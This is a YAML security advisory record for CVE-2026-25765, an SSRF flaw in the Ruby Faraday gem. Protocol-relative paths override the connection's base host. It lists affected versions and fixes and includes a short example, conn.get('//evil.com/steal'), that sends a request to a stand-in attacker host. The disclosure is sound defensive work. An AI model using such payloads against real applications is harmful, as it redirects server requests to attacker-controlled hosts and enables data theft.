---
identifier: "CVE-2026-25765"
identifiers:
- "CVE-2026-25765"
- "GHSA-33mh-2634-fwr2"
package_slug: "gem/faraday"
title: "Faraday affected by SSRF via protocol-relative URL host override in build_exclusive_url"
description: "Faraday's `build_exclusive_url` method (in `lib/faraday/connection.rb`)
  uses Ruby's\n`URI#merge` to combine the connection's base URL with a user-supplied
  path. Per RFC 3986,\nprotocol-relative URLs (e.g. `//evil.com/path`) are treated
  as network-path references\nthat override the base URL's host/authority component.\n\nThis
  means that if any application passes user-controlled input to Faraday's `get()`,\n`post()`,
  `build_url()`, or other request methods, an attacker can supply a\nprotocol-relative
  URL like `//attacker.com/endpoint` to redirect the request to an\narbitrary host,
  enabling Server-Side Request Forgery (SSRF).\n\nThe `./` prefix guard added in v2.9.2
  (PR #1569) explicitly exempts URLs starting with\n`/`, so protocol-relative URLs
  bypass it entirely.\n\n**Example:**\n```ruby\nconn = Faraday.new(url: 'https://api.internal.com')\nconn.get('//evil.com/steal')"
date: "2026-02-12"
pubdate: "2026-02-09"
affected_range: ">=2.0.0 <2.14.1||>=1.0.0 <1.10.5"
fixed_versions:
- "2.14.1"
- "1.10.5"
affected_versions: "All versions starting from 1.0.0 before 1.10.5, all versions starting
  from 2.0.0 before 2.14.1"
not_impacted: "All versions before 1.0.0, all versions starting from 1.10.5 before
  2.0.0, all versions starting from 2.14.1"
solution: "Upgrade to versions 1.10.5, 2.14.1 or above."
urls:
- "https://nvd.nist.gov/vuln/detail/CVE-2026-25765"
- "https://github.com/advisories/GHSA-33mh-2634-fwr2"
- "https://github.com/lostisland/faraday/security/advisories/GHSA-33mh-2634-fwr2"
- "https://github.com/lostisland/faraday/pull/1569"
- "https://github.com/lostisland/faraday/commit/a6d3a3a0bf59c2ab307d0abd91bc126aef5561bc"
- "https://github.com/lostisland/faraday"
- "https://github.com/lostisland/faraday/releases/tag/v1.10.5"
- "https://github.com/lostisland/faraday/releases/tag/v2.14.1"
- "https://github.com/rubysec/ruby-advisory-db/blob/master/gems/faraday/CVE-2026-25765.yml"
- "https://www.rfc-editor.org/rfc/rfc3986#section-5.2.2"
- "https://www.rfc-editor.org/rfc/rfc3986#section-5.4"
cvss_v3: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:N/A:N"
uuid: "00712e30-b271-4c48-a3ec-fa4ea7446dfa"
cwe_ids:
- "CWE-918"
- "CWE-937"
- "CWE-1035"
